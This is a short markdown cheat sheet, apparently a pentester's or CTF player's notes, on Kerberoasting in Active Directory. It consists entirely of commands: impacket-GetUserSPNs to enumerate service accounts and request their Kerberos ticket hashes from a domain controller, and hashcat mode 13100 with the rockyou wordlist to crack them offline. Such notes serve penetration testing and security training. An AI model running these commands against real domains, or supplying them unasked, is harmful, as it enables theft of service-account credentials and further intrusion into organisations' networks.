# Kerberoasting

## Check

```sh
impacket-GetUserSPNs domain/username:'password' -dc-ip $target
```

## Request

```sh
impacket-GetUserSPNs domain/username:'password' -dc-ip $target -request
```

## Crack it

```sh
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
